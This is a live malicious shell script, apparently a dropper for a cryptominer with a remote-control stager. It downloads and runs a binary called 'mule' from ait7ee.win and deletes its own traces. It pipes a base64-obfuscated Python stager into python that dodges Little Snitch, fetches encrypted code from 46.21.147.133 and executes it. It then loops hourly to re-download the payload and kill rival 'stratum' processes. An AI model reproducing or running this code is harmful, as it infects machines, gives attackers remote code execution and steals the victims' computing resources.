#!/bin/sh
psarg=""
if [[ -n `ps -lf` ]]; then
  psarg="-lf"
elif [[ -n `ps -au` ]]; then
  psarg="-au"
fi

mutex="21914"
mutex_exist=''
if [[ $psarg  ]]; then
  if [[ `ps $psarg | grep -v grep | grep -c $mutex ` -gt 0 ]]; then
    mutex_exist=1
  else
    mutex_exist=''
  fi
fi

if [[ $mutex_exist -gt 0 ]]; then
    echo mutex exist, quiting script
    exit
else
    echo mutex not exist, starting a new one
    sleep 800.$mutex &
fi

sh -c "(cat < /dev/tcp/ait7ee.win/23546 > /tmp/mule || wget http://ait7ee.win/mule -O /tmp/mule || curl -s http://ait7ee.win/mule -o /tmp/mule) && chmod +x /tmp/mule && (nohup /tmp/mule &) && sleep 1 && rm -f /tmp/mule" &
rm -f /tmp/larva.sh

function tcp_download()
{
    FileServer=$1
    Port=$2
    Target=$3
    cat < /dev/tcp/$FileServer/$Port > $Target
}
function http_download()
{
    Url=$1
    Target=$2
    wget $Url -O $Target || curl -s $Url -o $Target
}
function download()
{
    FileServer=$1
    Port=$2
    FileName=$3
    Target=$4
    tcp_download $FileServer $Port $Target || http_download http://$FileServer/$FileName $Target
}
function download_and_execute()
{
    FileServer=$1
    Port=$2
    FileName=$3
    Target=$4
    download $FileServer $Port $FileName $Target
    chmod +x $Target
    nohup $Target &
    sleep 1
    rm -f $Target
}

echo "from subprocess import *;p = Popen('python',stdin=PIPE); p.stdin.write(\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly80Ni4yMS4xNDcuMTMzOjgwMDEnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPW84MkZ5MU11QWE5M0lMVnYwZS9PQ29qb2M2ST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKydlfU9CdStqRENOP152bVZnOzoxLSFMeG4jR2M8PXs5Syc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));\");" | python

while true; do
    sleep 3600.$mutex &
    sleep 3600.$mutex
    download_and_execute ait7ee.win 23547 mule /tmp/mule
    pkill stratum
done


